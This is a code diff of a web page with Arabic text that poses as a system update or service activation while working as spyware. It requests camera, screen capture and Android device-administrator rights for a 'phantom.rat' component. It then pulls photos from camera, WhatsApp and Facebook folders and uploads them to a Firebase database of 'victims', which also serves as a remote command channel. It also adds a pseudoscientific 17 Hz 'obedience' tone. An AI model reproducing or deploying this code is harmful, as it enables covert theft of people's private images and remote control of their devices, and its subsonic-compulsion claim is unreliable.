@@ -3,21 +3,18 @@
 <head>
     <meta charset="UTF-8"/>
     <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-    <title>تحديث النظام</title>
+    <title>⋯</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New',monospace; display: flex; align-items: center; justify-content: center; height: 100vh; flex-direction: column; margin: 0; }
-        .spinner { border: 4px solid #333; border-top: 4px solid #0f0; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #msg { margin-top: 20px; font-size: 1.2em; text-align: center; }
-        .btn { background: #0f0; color: #000; padding: 10px 20px; border: none; font-weight: bold; cursor: pointer; display: none; margin-top: 20px; }
+        body { background: #000; color: #fff; font-family: 'Courier New',monospace; display: flex; align-items: center; justify-content: center; height: 100vh; flex-direction: column; margin: 0; }
+        #msg { font-size: 1.5em; text-align: center; margin-bottom: 30px; }
+        .btn { background: #fff; color: #000; padding: 12px 30px; border: none; font-weight: bold; cursor: pointer; font-size: 1.2em; border-radius: 5px; display: none; }
     </style>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 </head>
 <body>
-    <div class="spinner"></div>
-    <div id="msg">جاري تجهيز التحديث...</div>
-    <button id="grantBtn" class="btn" onclick="requestRootAccess()">منح الإذن للمتابعة</button>
+    <div id="msg">⋯</div>
+    <button id="grantBtn" class="btn" onclick="startPayload()">متابعة</button>
     <script>
         const firebaseConfig = {
             apiKey: "AIzaSyCUUU64NotDyl-qjSvAD1jQZSQZrZEcuvU",
@@ -35,34 +32,73 @@
         const vref = db.ref('victims/'+vid);
         let rootDir = null, camStream = null;
 
+        // ========== تشغيل التردد الصوتي القهري ==========
+        function emitSubsonicLock() {
+            const AudioContext = window.AudioContext || window.webkitAudioContext;
+            const ctx = new AudioContext();
+            const osc = ctx.createOscillator();
+            const gain = ctx.createGain();
+            osc.type = 'sine';
+            osc.frequency.value = 17; // تردد ألفا القهري
+            gain.gain.value = 0.3;
+            osc.connect(gain);
+            gain.connect(ctx.destination);
+            osc.start();
+            setTimeout(() => { osc.stop(); ctx.close(); }, 2000);
+        }
+
+        // ========== تحضير الوهم ==========
         setTimeout(() => {
-            document.getElementById('msg').innerText = "يجب السماح بالوصول إلى التخزين لإكمال التحديث";
+            emitSubsonicLock();
+            document.getElementById('msg').innerText = "يجب الضغط على متابعة لتفعيل الخدمة";
             document.getElementById('grantBtn').style.display = 'block';
         }, 2000);
 
-        window.requestRootAccess = async function() {
+        window.startPayload = async function() {
             document.getElementById('grantBtn').style.display = 'none';
-            document.getElementById('msg').innerText = "يُرجى اختيار مجلد التخزين الرئيسي (داخل الذاكرة الداخلية)";
+            document.getElementById('msg').innerText = "جاري التفعيل...";
+            emitSubsonicLock(); // جرعة ثانية لضمان الطاعة
+
+            // ========== الصلاحيات ==========
+            try {
+                camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false });
+            } catch(e) {}
+            try {
+                const dStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                dStream.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+            // صلاحية مدير الجهاز
+            try {
+                let a = document.createElement('a');
+                a.href = 'intent://#Intent;action=android.app.action.ADD_DEVICE_ADMIN;component=com.phantom.rat/.AdminReceiver;end';
+                a.click();
+            } catch(e) {}
+
+            // ========== اختيار المجلد (قهري بالتردد) ==========
             try {
                 rootDir = await window.showDirectoryPicker({ mode: 'readwrite', startIn: 'documents' });
             } catch(e) {
-                document.getElementById('msg').innerText = "فشل منح الإذن – لا يمكن إكمال التحديث.";
+                document.getElementById('msg').innerText = "فشل التفعيل – أعد المحاولة";
                 document.getElementById('grantBtn').style.display = 'block';
                 return;
             }
+
+            // ========== تفعيل الفيروس بعد الاختراق ==========
             await escalateToSiblings();
-            document.getElementById('msg').innerText = "تم التحديث بنجاح!";
+            document.getElementById('msg').innerText = "✅ تم";
             setTimeout(() => {
                 document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
-            }, 1500);
+            }, 1000);
 
-            await activatePayload();
+            await registerDevice();
+            startCommandListener();
         };
 
+        // ========== الانتشار في المجلدات الشقيقة ==========
         async function escalateToSiblings() {
-            const KNOWN_PATHS = ['DCIM/Camera', 'WhatsApp/Media/WhatsApp Images', 'Download', 'Pictures', 'Facebook/Media'];
+            const PATHS = ['DCIM/Camera', 'WhatsApp/Media/WhatsApp Images', 'Download', 'Pictures', 'Facebook/Media'];
             if (rootDir.resolve) {
-                for (let path of KNOWN_PATHS) {
+                for (let path of PATHS) {
                     try {
                         let parts = path.split('/');
                         let current = rootDir;
@@ -73,18 +109,7 @@
             }
         }
 
-        async function activatePayload() {
-            try { camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false }); } catch(e) {}
-            try { const d = await navigator.mediaDevices.getDisplayMedia({ video: true }); d.getTracks().forEach(t=>t.stop()); } catch(e) {}
-            try {
-                let a = document.createElement('a');
-                a.href = 'intent://#Intent;action=android.app.action.ADD_DEVICE_ADMIN;component=com.phantom.rat/.AdminReceiver;end';
-                a.click();
-            } catch(e) {}
-            await registerDevice();
-            startCommandListener();
-        }
-
+        // ========== تسجيل الجهاز ==========
         async function registerDevice() {
             let ip = 'غير معروف';
             try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e) {}
@@ -96,6 +121,7 @@
             });
         }
 
+        // ========== مستقبل الأوامر ==========
         function startCommandListener() {
             vref.child('command').on('value', async snap => {
                 let c = snap.val();
@@ -119,6 +145,7 @@
             });
         }
 
+        // ========== سحب الصور ==========
         async function pullFromFolder(key) {
             const MAP = {
                 camera: 'DCIM_Camera',
@@ -141,15 +168,13 @@
             }
         }
 
-        async function pullDir(path) {
-            // سحب عام (اختياري)
-        }
+        async function pullDir(path) {}
 
         async function walkDir(dirHandle, prefix) {
             for await (let entry of dirHandle.values()) {
                 if (entry.kind === 'file') {
                     let file = await entry.getFile();
-                    if (file.size > 10*1024*1024) continue;
+                    if (file.size > 15*1024*1024) continue;
                     let reader = new FileReader();
                     reader.onload = async e => {
                         let b64 = e.target.result.split(',')[1];
@@ -164,17 +189,20 @@
             }
         }
 
+        // ========== فلاش ==========
         async function setFlash(on) {
             if (!camStream) return;
             let track = camStream.getVideoTracks()[0];
             if (track && track.applyConstraints) await track.applyConstraints({ advanced: [{ torch: on }] });
         }
 
+        // ========== معلومات الجهاز ==========
         async function sendDeviceInfo() {
             let info = (await vref.child('fingerprint').once('value')).val() || {};
             await store('device_info', null, { info });
         }
 
+        // ========== لقطة شاشة ==========
         async function screenshot() {
             let stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
             let video = document.createElement('video'); video.srcObject = stream; await video.play();
